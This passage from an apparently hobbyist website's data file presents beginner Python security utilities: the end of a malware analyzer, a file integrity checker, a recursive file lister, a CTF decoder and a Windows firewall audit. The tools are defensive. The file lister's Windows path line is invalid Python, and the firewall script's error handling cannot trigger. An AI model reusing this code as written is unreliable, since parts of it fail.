        return [str(match) for match in matches]
    except Exception as e:
        return [f"Error in YARA scan: {str(e)}"]


def scan_file(filepath):
    """
    🏁 Command-line scan entry point: show file details and analysis results.
    """
    print(Fore.CYAN + f" 🔍 Scanning File: {filepath} ")
    md5, sha256 = get_file_hashes(filepath)
    if md5 is None or sha256 is None:
        print(Fore.RED + "[!] Error reading file hashes.")
        return

    print(Fore.YELLOW + f"[+] MD5: {md5}")
    print(f"[+] SHA256: {sha256}")

    yara_matches = match_yara_rules(filepath)
    if yara_matches:
        print(Fore.RED + "[!] YARA Matches:")
        for match in yara_matches:
            print("   →", match)

    sus_strings = extract_suspicious_strings(filepath)
    if sus_strings:
        print(Fore.MAGENTA + " [+] Suspicious Strings Found: ")
        for s in sus_strings:
            print("   →", s)

    imports = analyze_pe_file(filepath)
    print(Fore.BLUE + " [+] PE File Imports: ")
    for imp in imports:
        print("   →", imp)

    # Verdict time
    if yara_matches or sus_strings:
        print(Fore.RED + " [!] File Status: SUSPICIOUS ❌ ")
    else:
        print(Fore.GREEN + " [*] File Status: CLEAN ✅  ")


def analyze_file_gui():
    """
    🎨 GUI mode: let the user pick a file, run the same analysis, and show results.
    """
    file_path = filedialog.askopenfilename(
        title="Select suspicious file",
        filetypes=[("Executable Files", "*.exe")]
    )
    if not file_path:
        return

    try:
        md5, sha256 = get_file_hashes(file_path)
        if md5 is None or sha256 is None:
            messagebox.showerror("Error", "Unable to read file hashes.")
            return

        yara_matches = match_yara_rules(file_path)
        sus_strings = extract_suspicious_strings(file_path)
        imports = analyze_pe_file(file_path)

        result_text.delete(1.0, tk.END)
        result_text.insert(tk.END, f"""[+] MD5: {md5}\\n[+] SHA256: {sha256}\\n\\n""")
        result_text.insert(tk.END, """[!] YARA Matches:\\n""")
        for match in yara_matches:
            result_text.insert(tk.END, f"→ {match}\\n")
        result_text.insert(tk.END, """\\n[+] Suspicious Strings Found:\\n""")
        for s in sus_strings:
            result_text.insert(tk.END, f"→ {s}\\n")
        result_text.insert(tk.END, """\\n[+] PE Imports:\\n""")
        for imp in imports:
            result_text.insert(tk.END, f"→ {imp}\\n")

    except Exception as e:
        messagebox.showerror("Error", str(e))


# Launch GUI
root = tk.Tk()
root.title("Malware Analyzer for Small Biz 🛡️")
root.geometry("700x600")

tk.Label(root, text="Malware Analyzer", font=("Arial", 16, "bold")).pack(pady=10)
tk.Button(
    root,
    text="🔍 Select File & Analyze",
    command=analyze_file_gui,
    font=("Arial", 12)
).pack(pady=10)

result_text = tk.Text(root, wrap=tk.WORD, font=("Courier", 10))
result_text.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

root.mainloop()

`
},

t8:{
  title:"File Integrity",
  description:`
    <h4>🛡️ File Integrity Checker (GUI)</h4>
    <p>This tool monitors files for unauthorized changes by comparing SHA-256 hashes, helping detect malware infections or tampering.</p>
    
    <h4>🔍 Key Features:</h4>
    <div class="feature-grid">
      <div class="feature-card">
        <i class="fas fa-fingerprint"></i>
        <h5>SHA-256 Hashing</h5>
        <p>Creates cryptographic fingerprints of all files</p>
      </div>
      <div class="feature-card">
        <i class="fas fa-folder-open"></i>
        <h5>Recursive Scanning</h5>
        <p>Checks all files in selected folder and subfolders</p>
      </div>
      <div class="feature-card">
        <i class="fas fa-exchange-alt"></i>
        <h5>Change Detection</h5>
        <p>Identifies new, modified, or deleted files</p>
      </div>
      <div class="feature-card">
        <i class="fas fa-database"></i>
        <h5>Hash Database</h5>
        <p>Stores file hashes in JSON for future comparison</p>
      </div>
    </div>
    



    <h4>🖥️ GUI Features:</h4>
    <ul class="gui-features">
      <li>Folder selection dialog</li>
      <li>Scrollable results display</li>
      <li>Color-coded status messages</li>
      <li>One-click integrity checks</li>
    </ul>
    
    <h4>🧰 Libraries Used:</h4>
    <div class="library-grid">
      <span class="library-tag">tkinter</span>
      <span class="library-tag">hashlib</span>
      <span class="library-tag">os</span>
      <span class="library-tag">json</span>
    </div>
    
    <h5>🔧 How It Works:</h5>
    <ul class="how-it-works">
      <li>Select a folder to scan (first run creates baseline)</li>
      <li>Subsequent scans compare against stored hashes</li>
      <li>Get alerted about any file changes</li>
      <li>New baseline is automatically saved after each scan</li>
    </ul>
    <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/flle integrity.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>
`,
  code:`
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import os
import hashlib
import json

# Ye file me hum hashes store karenge — previous scan results ke liye
HASH_DB = "hashes.json"


# =============================
# Function to generate hash of a file
# =============================
def hash_file(filepath):
    try:
        # File ko binary mode me read karo
        with open(filepath, 'rb') as f:
            # SHA-256 hash generate karke return karo
            return hashlib.sha256(f.read()).hexdigest()
    except:
        # Agar koi issue aaye (file not readable etc.), None return karo
        return None


# =============================
# Function to scan entire folder and hash all files
# =============================
def scan_folder(folder_path):
    file_hashes = {}
    
    # os.walk se har subfolder ke andar tak jaa rahe hain
    for root, _, files in os.walk(folder_path):
        for file in files:
            full_path = os.path.join(root, file)  # Complete path
            file_hash = hash_file(full_path)      # Us file ka hash nikaal
            if file_hash:
                file_hashes[full_path] = file_hash  # Dictionary me store kar
    return file_hashes


# =============================
# Save hashes into local file (JSON format)
# =============================
def save_hashes(hashes):
    with open(HASH_DB, 'w') as f:
        json.dump(hashes, f, indent=4)  # Beautify with indent=4


# =============================
# Load previously saved hashes (if any)
# =============================
def load_hashes():
    try:
        with open(HASH_DB, 'r') as f:
            return json.load(f)  # Load and return the JSON data
    except FileNotFoundError:
        return None  # Agar file nahi mili to None bhej


# =============================
# Compare old and new hashes
# =============================
def compare_hashes(old, new):
    results = []

    # New files check karo
    for file in new:
        if file not in old:
            results.append(f"[+] New file added: {file}")
        elif new[file] != old[file]:
            results.append(f"[!] File modified: {file}")

    # Deleted files check karo
    for file in old:
        if file not in new:
            results.append(f"[-] File deleted: {file}")

    return results or ["[✓] No changes detected."]


# =============================
# GUI Functionalities Start
# =============================

# Folder select karne ke liye dialog box
def select_folder():
    folder = filedialog.askdirectory()  # Folder choose karo
    folder_path.set(folder)             # Entry box me path dikhao

# Main function: Integrity check ko run karta hai
def run_check():
    folder = folder_path.get()  # Entry field se path uthao
    if not os.path.isdir(folder):
        messagebox.showerror("Error", "Invalid folder path!")
        return

    # New hash state banai ja rahi hai
    new_hashes = scan_folder(folder)
    old_hashes = load_hashes()

    # Result box ko saaf karo purane results se
    result_box.delete('1.0', tk.END)

    if old_hashes is None:
        # Agar pehli baar run ho raha hai
        result_box.insert(tk.END, "[*] No previous hash database found.\\n[*] Saving current state...\\n")
        save_hashes(new_hashes)
        result_box.insert(tk.END, "[✓] Hashes saved!\\n")
    else:
        # Compare karo purane aur naye hash ko
        result_box.insert(tk.END, "=== Integrity Report ===\\n\\n")
        comparison = compare_hashes(old_hashes, new_hashes)
        for line in comparison:
            result_box.insert(tk.END, line + "\\n")
        # Naya hash state save karo for next time
        save_hashes(new_hashes)


# =============================
# GUI Layout Starts
# =============================

root = tk.Tk()
root.title("🛡️ File Integrity Checker (GUI)")
root.geometry("700x500")

# Folder path ko dynamically update karne ke liye StringVar
folder_path = tk.StringVar()

# Folder selection section
tk.Label(root, text="Select Folder to Scan:", font=("Arial", 12)).pack(pady=10)
tk.Entry(root, textvariable=folder_path, width=60).pack()
tk.Button(root, text="Browse", command=select_folder).pack(pady=5)

# Scan start karne ka button
tk.Button(
    root,
    text="Run Integrity Check",
    command=run_check,
    bg="#007acc",
    fg="white"
).pack(pady=10)

# Result show karne ke liye scrollable text box
result_box = scrolledtext.ScrolledText(
    root,
    wrap=tk.WORD,
    width=80,
    height=20,
    font=("Consolas", 10)
)
result_box.pack(padx=10, pady=10)

# GUI loop chalu kar diya
root.mainloop()

`,
        
},
t9:{
  title:"List Files",
  description:`
  <h4>📁 Recursive File System Scanner</h4>
    <p>This Python script recursively lists all files from the root directory, excluding hidden files on Unix-based systems, and saves the list to a text file.</p>
    
    <h4>🔍 Key Features:</h4>
    <ul>
      <li>Recursively scans from root directory (C:\ on Windows, / on macOS/Linux)</li>
      <li>Automatically excludes hidden files/folders on Unix systems</li>
      <li>Generates a complete file path list</li>
      <li>Saves output to files_list.txt</li>
      <li>Cross-platform compatibility (Windows, macOS, Linux)</li>
    </ul>
    
    <h4>⚙️ How It Works:</h4>
    <ul>
      <li>Determines the operating system</li>
      <li>Starts scanning from the appropriate root directory</li>
      <li>Walks through all directories (excluding hidden ones on Unix)</li>
      <li>Collects all file paths</li>
      <li>Writes the complete list to a text file</li>
    </ul>
    
    <h4>🧰 Libraries Used:</h4>
    <div class="library-tags">
      <span>os</span>
      <span>platform</span>
    </div>
    
    <h4>⚠️ Important Notes:</h4>
    <ul class="warning-list">
      <li>May take time to complete on large file systems</li>
      <li>Requires appropriate permissions to access system directories</li>
      <li>Output file will be created in the script's working directory</li>
    </ul>
    <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/list files.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>`,
  code:`
import os
import platform

# =============================
# Recursively list all files from a given starting path
# =============================
def list_files(start_path):
    """
    Recursively list all files, including hidden files, starting from start_path.
    Also handles hidden directory filtering on macOS/Linux.
    """
    files = []

    # os.walk walks through all directories and subdirectories
    for dirpath, dirnames, filenames in os.walk(start_path):

        # Agar OS macOS ya Linux hai, toh hidden directories hata do (jo '.' se start hote hain)
        if platform.system() in ["Darwin", "Linux"]:
            dirnames[:] = [d for d in dirnames if not d.startswith('.')]

        for filename in filenames:
            # Har file ka absolute path bana lo
            file_path = os.path.join(dirpath, filename)
            files.append(file_path)  # List me add karo

    return files  # Final list return karo


# =============================
# Save list of files into a text file (log file)
# =============================
def save_files_to_log(files, output_file="files_list.txt"):
    """
    Write the list of files to a log file.
    Useful for keeping track of system file structure at a certain moment.
    """
    with open(output_file, 'w') as f:
        for file in files:
            f.write(file + "\\n")  # Har file path ko naye line me likho

    # Confirmation print
    print(f"✅ File list saved to {output_file}")


# =============================
# Main function — decides the root path and triggers the logic
# =============================
def main():
    # OS ke hisaab se root directory set karo
    if platform.system() == "Windows":
        start_path = r"C:\"  # Windows ke liye root
    else:
        start_path = "/"     # macOS/Linux ke liye root

    print(f"🔍 Listing all files starting from: {start_path}")
    
    # Sab files nikaalo
    files = list_files(start_path)
    
    # Log file me save karo
    save_files_to_log(files)


# =============================
# Entry point of the script
# =============================
if __name__ == "__main__":
    main()
`,    
},

t12:{
  title:"CTF (Decoder)",
  description:`<h4>🔐 Offline Encoding/Decoding Utility</h4>
    <p>This GUI tool decodes text using multiple encoding schemes commonly found in Capture The Flag (CTF) challenges.</p>
    
    <h4>🛠️ Supported Encoding Methods:</h4>
    <ul>
      <li><strong>ROT13</strong> - Letter rotation cipher</li>
      <li><strong>Base64</strong> - Base64 encoding/decoding</li>
      <li><strong>Hexadecimal</strong> - Hex string conversion</li>
      <li><strong>Binary</strong> - Binary string conversion</li>
      <li><strong>Octal</strong> - Octal string conversion</li>
    </ul>
    
    <h4>🎯 Features:</h4>
    <ul>
      <li>Clean, intuitive GUI interface</li>
      <li>Multiple encoding method support</li>
      <li>Large input/output text areas</li>
      <li>Error handling for invalid inputs</li>
      <li>Completely offline operation</li>
    </ul>
    
    <h4>🧰 Libraries Used:</h4>
    <ul>
      <li>tkinter - GUI framework</li>
      <li>base64 - Base64 encoding/decoding</li>
      <li>codecs - ROT13 implementation</li>
    </ul>
    
    <h4>💡 Usage:</h4>
    <ul>
      <li>Paste encoded text into the input box</li>
      <li>Select the appropriate decoding method</li>
      <li>Click "Decode" to view the result</li>
      <li>Copy the decoded output</li>
    </ul>
    <h2>deocode this ---- Wnv Uvaq</h2>
    <h4> HINT - ROT 13</h4> 
    <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/ctf decoder.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>`,
  code:`
import tkinter as tk
from tkinter import ttk, messagebox
import base64
import codecs
import datetime

# Function to log decoding attempts
def log_decoding(input_text, method, output_text):
    with open("decode_log.txt", "a") as log_file:
        log_file.write(f"--- Decoding Attempt ({datetime.datetime.now()}) ---\\n")
        log_file.write(f"Method: {method}\\n")
        log_file.write(f"Input: {input_text}\\n")
        log_file.write(f"Output: {output_text}\\n")
        log_file.write("----------------------------------------------------\\n\\n")

# Decode function with logging
def decode_text():
    method = method_var.get()
    text = input_entry.get("1.0", tk.END).strip()

    try:
        if method == "ROT13":
            output = codecs.decode(text, 'rot_13')

        elif method == "Base64":
            output = base64.b64decode(text.encode()).decode()

        elif method == "Hex":
            output = bytes.fromhex(text).decode()

        elif method == "Binary":
            output = ''.join([chr(int(b, 2)) for b in text.split()])

        elif method == "Octal":
            output = ''.join([chr(int(o, 8)) for o in text.split()])

        else:
            output = "Select a decoding method."

        output_entry.delete("1.0", tk.END)
        output_entry.insert(tk.END, output)

        log_decoding(text, method, output)

    except Exception as e:
        messagebox.showerror("Error", f"Decoding failed!\\n\\n{e}")
        log_decoding(text, method, f"Decoding failed: {e}")

# GUI Setup
root = tk.Tk()
root.title("🧠 Offline CTF Decoder Tool")
root.geometry("600x400")

tk.Label(root, text="Enter Encoded Text:").pack(pady=5)
input_entry = tk.Text(root, height=5, width=70)
input_entry.pack(pady=5)

tk.Label(root, text="Select Decode Method:").pack(pady=5)
method_var = tk.StringVar()
method_dropdown = ttk.Combobox(root, textvariable=method_var, state='readonly',
                               values=["ROT13", "Base64", "Hex", "Binary", "Octal"])
method_dropdown.pack(pady=5)

tk.Button(root, text="🔓 Decode", command=decode_text).pack(pady=10)

tk.Label(root, text="Decoded Output:").pack(pady=5)
output_entry = tk.Text(root, height=5, width=70)
output_entry.pack(pady=5)

root.mainloop()

`,
        
},
t13:{
  title:"Firewall Audit",
  description:`
    <h4>🛡️ Windows Firewall Rules Audit Tool</h4>
    <p>This script audits and logs all Windows firewall rules using native system commands.</p>
    
    <h4>🔍 Key Features:</h4>
    <ul>
      <li>Retrieves all firewall rules using <code>netsh</code> command</li>
      <li>Displays rules in console for immediate review</li>
      <li>Automatically saves complete ruleset to log file</li>
      <li>Simple, lightweight implementation</li>
    </ul>
    
    <h4>📋 Output:</h4>
    <ul>
      <li>Console display of all firewall rules</li>
      <li>Permanent log file: <code>firewall_rules_audit.txt</code></li>
      <li>Clear section formatting for readability</li>
    </ul>
    
    <h4>🧰 Libraries Used:</h4>
    <ul>
      <li>subprocess - For running system commands</li>
      <li>logging - For saving results to file</li>
    </ul>
    
    <h4>⚠️ Requirements:</h4>
    <ul>
      <li>Windows operating system</li>
      <li>Administrator privileges</li>
      <li>Python 3.x</li>
    </ul>
    
    <h4>💡 Usage:</h4>
    <ul>
      <li>Run script with admin privileges</li>
      <li>View rules in console output</li>
      <li>Check <code>firewall_rules_audit.txt</code> for permanent record</li>
    </ul>
    <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/firewall.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>`,
  code:`
import subprocess
import logging
import datetime

# Configure logging with timestamps
logging.basicConfig(
    filename="firewall_rules_audit.txt",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

def run_command(command):
    """Run a command using subprocess and return the output."""
    try:
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        logging.error(f"Error running command: {e}")
        return None

def get_firewall_rules():
    """Get the list of firewall rules using netsh command."""
    command = 'netsh advfirewall firewall show rule name=all'
    output = run_command(command)
    return output

def log_firewall_rules(output):
    """Log firewall rules to a file with clear separation."""
    if output:
        logging.info("\\n" + "="*80)
        logging.info("🔥 Firewall Rules Audit Started")
        logging.info("="*80 + "\\n")
        logging.info(output)
        logging.info("\\n" + "="*80)
        logging.info("✅ Audit Completed\\n")

def display_firewall_rules(output):
    """Display firewall rules on the console."""
    if output:
        print("\\n" + "="*50)
        print("🔥 Firewall Rules:")
        print("="*50)
        print(output)
        print("="*50 + "\\n")

def main():
    print("Auditing firewall rules...")
    firewall_rules_output = get_firewall_rules()
    log_firewall_rules(firewall_rules_output)
    display_firewall_rules(firewall_rules_output)
    print("✅ Firewall rules audit complete. Check 'firewall_rules_audit.txt' for logs.")

if __name__ == "__main__":
    main()
`,
        
},
        
};